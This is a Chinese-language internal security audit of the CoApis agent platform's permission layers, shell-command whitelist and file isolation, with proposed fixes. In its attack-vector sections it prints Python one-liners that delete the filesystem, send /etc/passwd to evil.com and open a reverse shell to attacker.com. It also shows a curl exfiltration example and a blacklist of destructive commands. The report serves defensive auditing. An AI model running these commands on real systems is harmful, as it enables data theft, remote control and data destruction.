# CoApis 用户权限深度分析报告

> 生成时间: 2026-06-02 07:30  
> 分析范围: API 路由权限、文件系统隔离、Shell 命令控制、Agent 工具链安全

---

## 一、架构概览

### 1.1 权限模型

```
角色层次: admin > advanced > user > visitor
权限格式: {module}:{action}  (如 chat:send, myspace:write)
```

### 1.2 四层防御体系

```
┌─────────────────────────────────────────────────────┐
│ Layer 1: AuthMiddleware — 身份认证 (JWT Token)       │
├─────────────────────────────────────────────────────┤
│ Layer 2: UserIsolationMiddleware — 路径级权限        │
│          (Admin路径检查 + Workspace路径隔离)          │
├─────────────────────────────────────────────────────┤
│ Layer 3: @require_permission / @require_role         │
│          — API 端点级权限装饰器                        │
├─────────────────────────────────────────────────────┤
│ Layer 4: WorkspaceGuard — 工具执行级防护              │
│          (文件路径边界 + Shell命令白名单)              │
└─────────────────────────────────────────────────────┘
```

---

## 二、各层详细分析

### 2.1 Layer 1: 身份认证

**文件**: `server/coapis/user_system/middleware.py`

**机制**: JWT Token 验证，所有请求在中间件中解析 `Authorization: Bearer {token}`，将 `username` 和 `role` 注入 `request.state`。

**结论**: ✅ 安全 — 无 token 或无效 token 的请求被拒绝（401）。

---

### 2.2 Layer 2: 路径级隔离

**文件**: `server/coapis/app/middleware/user_isolation.py`

**Admin 路径保护**:
```python
ADMIN_PREFIXES = [
    "/admin/system",
    "/admin/users",
    "/admin/config",
    "/admin/audit",
]
```
非 admin 角色访问这些路径时被拒绝（403）。✅

**Workspace 路径保护**:
```python
WORKSPACE_PREFIXES = [
    "/workspace/agents",
    "/workspace/models",
    "/workspace/skills",
    "/workspace/security",
    "/workspace/backups",
    "/workspace/audit",
    "/workspace/myspace",
    "/myfiles",
]
```
非 admin 用户访问其他用户的资源时被拒绝（403）。✅

#### ⚠️ 问题 1: Admin 路径覆盖不完整

**严重程度: P1 (高)**

当前 `ADMIN_PREFIXES` 仅包含 4 个路径前缀，但系统中有大量 `/api/admin/*` 路由：

| 路由模块 | 实际前缀 | 是否在 ADMIN_PREFIXES |
|---------|---------|---------------------|
| admin_system | `/admin/system` | ✅ |
| admin_users | `/admin/users` | ✅ |
| admin_config | `/admin/config` | ✅ |
| admin_audit | `/admin/audit` | ✅ |
| admin_templates | `/admin/templates` | ❌ |
| admin_global_agents | `/admin/global-agents` | ❌ |
| admin_tools | `/admin/tools` | ❌ |

**风险**: 如果中间件在装饰器之前拦截，这些新增的 admin 路由可能绕过路径级检查。但因为它们有自己的 `_check_admin()` 函数（见 Layer 3），所以实际风险较低——**两层防御中至少有一层有效**。但不一致的防御策略仍然是一个隐患。

---

### 2.3 Layer 3: API 端点级权限

**文件**: `server/coapis/app/permissions/decorators.py`

**两种风格**:

| 风格 | 使用方式 | 覆盖范围 |
|------|---------|---------|
| `@require_permission("module:action")` | 基于细粒度权限 | 大部分路由 |
| `@require_role("admin")` | 基于角色 | 管理类路由 |
| `_check_admin(request)` | 内联检查 | admin_*.py 新路由 |

#### ⚠️ 问题 2: 权限检查风格不统一

**严重程度: P2 (中)**

Admin 路由（templates, global_agents, tools）使用自定义的 `_check_admin()` 函数而非统一的装饰器：

```python
def _check_admin(request: Request) -> str:
    username = getattr(request.state, "username", None)
    role = getattr(request.state, "role", "visitor")
    if role != "admin":
        raise HTTPException(403, "需要管理员权限")
    return username
```

这不影响安全性（功能正确），但不统一的风格增加了维护负担和审计复杂度。

#### 各路由权限覆盖统计

| 路由模块 | 端点数 | 有权限检查 | 覆盖率 |
|---------|--------|-----------|-------|
| agent.py | 19 | 19 | ✅ 100% |
| chats.py | 7 | 7 | ✅ 100% |
| skills.py | ~20 | ~20 | ✅ 100% |
| files.py | ~10 | ~3 | ⚠️ **30%** |
| providers.py | ~15 | ~15 | ✅ 100% |
| config_router.py | ~10 | ~10 | ✅ 100% |
| evolution.py | ~20 | ~20 | ✅ 100% |
| mcp.py | 8 | 8 | ✅ 100% |
| cron.py | 10 | 10 | ✅ 100% |
| tools.py | 3 | 3 | ✅ 100% |
| security.py | ~12 | ~12 | ✅ 100% |
| admin_*.py | ~30 | ~30 | ✅ 100% |

#### ⚠️ 问题 3: files.py 路由缺少权限装饰器

**严重程度: P2 (中)**

`files.py` 中大部分端点（`list_files`, `download_file`, `preview_file`, `delete_file`, `mkdir`, `move_file`, `copy_file`, `get_config`, `get_usage`）没有 `@require_permission` 装饰器。它们通过 `get_current_user(request)` 获取用户名，但**不检查具体权限**。

**当前保护**:
- 身份认证: ✅（必须登录）
- 路径隔离: ✅（`FileService._resolve_path` 防止路径遍历）
- 权限粒度: ❌（任何已登录用户都可以执行所有文件操作）

**风险**: visitor 角色的用户理论上可以创建、删除文件，只要操作限于自己的工作区。

---

### 2.4 Layer 4: 工具执行级防护

**文件**: `server/coapis/agents/security/workspace_guard.py`

#### 2.4.1 文件路径边界

```python
def is_within_workspace(self, target_path):
    ws = Path(workspace_dir).expanduser().resolve()
    target_resolved = Path(target_path).expanduser().resolve()
    target_resolved.relative_to(ws)  # 越界抛 ValueError
```

**机制**: 
1. 跟随符号链接解析真实路径
2. 检查解析后的路径是否在工作区内
3. 支持符号链接（如 `workspace/files/` → `workspaces/{username}/files/`）

**结论**: ✅ 安全 — 路径遍历被有效阻止。

#### 2.4.2 Shell 命令白名单

```python
FALLBACK_SHELL_WHITELIST = {
    "visitor": [],         # 无 shell 权限
    "user": ["ls", "cat", "head", "tail", "grep", "find",
             "pwd", "date", "echo", "mkdir", "touch", "rm", "rm -rf",
             "cp", "mv", "tree", "python3", "git", "curl", "chmod", "chown", ...],
    "advanced": [..., "docker", "systemctl", "apt", "kill", "tar", "crontab"],
    "admin": ["*"],        # 无限制
}
```

**黑名单**:
```python
FALLBACK_SHELL_BLACKLIST = [
    "rm -rf /", "rm -rf /*", "mkfs.*", "dd if=", "shutdown", "reboot", ...
]
```

#### ⚠️ 问题 4: 普通用户 Shell 命令过于宽松

**严重程度: P1 (高)**

普通 `user` 角色可以执行的命令包括：
- `rm -rf` — 可以递归删除工作区内的任何内容
- `chmod`, `chown` — 可以修改文件权限
- `python3` — 可以执行任意 Python 代码
- `curl`, `wget` — 可以发起网络请求
- `git` — 可以执行 git 操作（可能泄露远程仓库凭据）

**风险**:
1. `rm -rf` 配合路径遍历漏洞（虽然已被 Layer 4 阻止），可能导致数据丢失
2. `python3 -c "import os; os.system('...')"` 可以绕过白名单执行任意命令
3. `curl` 可以将数据外泄到外部服务器

#### ⚠️ 问题 5: Python/Node 命令可绕过 Shell 白名单

**严重程度: P0 (严重)**

白名单允许 `python3` 和 `node`，这意味着用户可以执行：
```bash
python3 -c "import subprocess; subprocess.run(['rm', '-rf', '/'])"
python3 -c "import os; os.system('任意命令')"
node -e "require('child_process').exec('任意命令')"
```

这完全绕过了 Shell 命令白名单和黑名单机制。

---

### 2.5 文件系统隔离

#### 2.5.1 工作区结构

```
/apps/ai/coapis/
├── system/           # 系统级（admin-only）
│   ├── config.json
│   ├── users.json
│   ├── auth.json
│   ├── permissions.json
│   ├── providers.json
│   ├── templates/
│   ├── evolution/
│   └── .secret/
├── agents/           # 全局智能体（admin-only）
│   ├── default/
│   └── CoApis_QA_Agent_0.2/
├── skills/           # 全局技能模板（只读）
└── workspaces/       # 用户工作区
    ├── admin/
    │   ├── agent.json
    ├── testuser/
    │   ├── agent.json
    └── test_528/
        └── agent.json
```

#### 2.5.2 FileService 隔离

```python
class LocalFileBackend(FileService):
    def __init__(self, data_dir: Path):
        self.data_dir = data_dir  # = WORKSPACES_DIR

    def _get_user_dir(self, username, category):
        user_dir = self.data_dir / username / category
        return user_dir

    def _resolve_path(self, user_dir, rel_path):
        target = user_dir / rel_path
        target.resolve().relative_to(user_dir.resolve())  # 防路径遍历
        return target
```

**结论**: ✅ 安全 — 每个用户只能访问 `workspaces/{username}/` 下的文件。

#### 2.5.3 Agent 工作区隔离

每个用户的 Agent 工作区位于 `workspaces/{username}/agents/{agent_id}/`：
- 用户 A 不能访问用户 B 的 Agent 工作区
- Agent 通过符号链接访问用户文件：`workspace/files/` → `workspaces/{username}/files/`

**结论**: ✅ 安全

---

## 三、发现的安全问题汇总

### 3.1 严重程度分类

| 编号 | 问题 | 严重程度 | 当前缓解措施 |
|------|------|---------|------------|
| **#1** | Python/Node 命令可绕过 Shell 白名单 | **P0 (严重)** | WorkspaceGuard 路径检查部分缓解 |
| **#2** | 普通用户可执行 rm -rf、chmod、curl | **P1 (高)** | 限于工作区目录内 |
| **#3** | ADMIN_PREFIXES 不完整 | **P1 (高)** | Admin 路由自身有 `_check_admin()` |
| **#4** | files.py 缺少权限装饰器 | **P2 (中)** | 身份认证 + 路径隔离已提供基础保护 |
| **#5** | 权限检查风格不统一 | **P2 (中)** | 所有风格均有效 |
| **#6** | console.py 无任何权限检查 | **P2 (中)** | 依赖中间件认证 |
| **#7** | global agent 对普通用户通过 API 可见 | **P2 (中)** | 后端 list_agents 已过滤 |
| **#8** | system/ 目录无文件系统级保护 | **P3 (低)** | Docker 以 root 运行，无 fs 隔离 |

### 3.2 详细说明

#### #1 P0: Python/Node 命令可绕过 Shell 白名单

**位置**: `server/coapis/agents/security/workspace_guard.py` + `server/coapis/agents/tools/shell.py`

**根因**: Shell 白名单以命令第一词匹配（`python3`, `node`），但这些语言解释器可以执行任意代码。

**攻击向量**:
```bash
# 绕过黑名单
python3 -c "import subprocess; subprocess.run(['rm', '-rf', '/'])"

# 数据外泄
python3 -c "import urllib.request; urllib.request.urlopen('http://evil.com/steal?data='+open('/etc/passwd').read())"

# 反弹 shell
python3 -c "import socket,subprocess;s=socket.socket();s.connect(('attacker.com',4444));subprocess.call(['sh'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())"
```

**当前缓解**: WorkspaceGuard 的 `is_within_workspace()` 检查可以阻止访问工作区外的文件，但无法阻止网络请求和进程操作。

#### #2 P1: 普通用户 Shell 命令过于宽松

**位置**: `FALLBACK_SHELL_WHITELIST["user"]`

**风险命令**:
- `rm -rf`: 可删除工作区内所有数据
- `chmod 777`: 可修改文件权限（虽然在 Docker 中影响有限）
- `curl http://evil.com -d @/path/to/secret`: 可将文件内容发送到外部
- `git clone ssh://...`: 可能泄露 SSH 密钥

#### #3 P1: ADMIN_PREFIXES 不完整

**位置**: `server/coapis/app/middleware/user_isolation.py`

**缺失的路径**:
- `/admin/templates` (admin_templates.py)
- `/admin/global-agents` (admin_global_agents.py)
- `/admin/tools` (admin_tools.py)

**影响**: 这些路径不会被 Layer 2 的中间件拦截，但因为有 Layer 3 的 `_check_admin()` 保护，所以实际安全性不受影响。但这违反了"纵深防御"原则。

#### #4 P2: files.py 缺少权限装饰器

**位置**: `server/coapis/app/routers/files.py`

**缺少权限检查的端点**:
- `GET /myfiles/list` — 无装饰器
- `GET /myfiles/download` — 无装饰器
- `GET /myfiles/preview` — 无装饰器
- `DELETE /myfiles/delete` — 无装饰器
- `POST /myfiles/mkdir` — 无装饰器
- `POST /myfiles/move` — 无装饰器
- `POST /myfiles/copy` — 无装饰器

**已有权限检查的端点**:
- `POST /myfiles/upload` — `@require_role("user")`
- `GET /myfiles/config` — 无装饰器
- `GET /myfiles/usage` — 无装饰器

**风险**: visitor 角色用户可以执行文件创建、删除等操作（只要在自己的工作区内）。

---

## 四、解决方案建议

### 4.1 P0: 解决 Python/Node 命令绕过

**方案 A (推荐): 禁止解释器模式**

在 Shell 命令验证中增加**参数检查**：
```python
INTERPRETER_COMMANDS = {"python3", "python", "node", "ruby", "perl"}

def check_command(command: str):
    parts = command.strip().split()
    if not parts:
        return
    base = parts[0]
    
    # 禁止解释器的危险参数
    if base in INTERPRETER_COMMANDS:
        dangerous_flags = {"-c", "-e", "--eval", "-m"}
        for part in parts[1:]:
            if part in dangerous_flags:
                raise ValueError(f"解释器的 {part} 参数被禁止")
```

**方案 B: 限制解释器参数为文件路径**

只允许 `python3 script.py`，不允许 `python3 -c "..."`

**方案 C: 沙箱化执行**

使用 Docker/nsjail/seccomp 隔离 Shell 命令执行环境。

### 4.2 P1: 限制普通用户 Shell 命令

**建议调整**:
```python
"user": [
    "ls", "ls -la", "ls -l", "ls -a", "ls -1",
    "cat", "head", "tail", "wc", "grep", "find",
    "pwd", "date", "whoami",
    "echo", "printf",
    "mkdir", "mkdir -p",
    "touch",
    "cp", "cp -r",
    "mv",
    "tree",
    "sort", "uniq", "cut", "tr", "sed", "awk",
    # 移除: rm, rm -rf, chmod, chown, curl, wget, python3, node, git
]
```

**如果需要保留编程能力**:
```python
# 使用沙箱模式
"python3": {"sandbox": True, "network": False, "allowed_paths": ["workspace"]}
```

### 4.3 P1: 补全 ADMIN_PREFIXES

```python
ADMIN_PREFIXES = [
    "/admin/system",
    "/admin/users",
    "/admin/config",
    "/admin/audit",
    "/admin/templates",       # 新增
    "/admin/global-agents",   # 新增
    "/admin/tools",           # 新增
]
```

### 4.4 P2: 为 files.py 添加权限装饰器

```python
@router.get("/list")
@require_permission("myspace:read")  # 新增
async def list_files(...):

@router.delete("/delete")
@require_permission("myspace:delete")  # 新增
async def delete_file(...):

@router.post("/mkdir")
@require_permission("myspace:write")  # 新增
async def mkdir(...):
```

### 4.5 P2: 统一权限检查风格

将 admin_*.py 中的 `_check_admin()` 替换为统一的 `@require_role("admin")` 装饰器。

---

## 五、安全评分

| 维度 | 评分 | 说明 |
|------|------|------|
| 身份认证 | 9/10 | JWT + bcrypt，安全 |
| 路径隔离 | 8/10 | 路径遍历防护有效，符号链接支持 |
| API 权限 | 7/10 | 大部分覆盖，files.py 缺失 |
| Shell 安全 | 4/10 | 白名单被 Python/Node 绕过 |
| 文件系统 | 6/10 | Docker 内 root 运行，无额外隔离 |
| **综合** | **6.8/10** | 需要修复 P0 问题 |

---

## 六、优先级排序

1. **立即修复 (P0)**: 禁止 `python3 -c` / `node -e` 等解释器内联执行
2. **高优先 (P1)**: 收紧普通用户 Shell 白名单（移除 rm -rf, curl, chmod）
3. **高优先 (P1)**: 补全 ADMIN_PREFIXES
4. **中优先 (P2)**: 为 files.py 添加权限装饰器
5. **中优先 (P2)**: 统一 admin 路由权限检查风格
6. **低优先 (P3)**: 评估是否需要文件系统级隔离（chroot/nsjail）
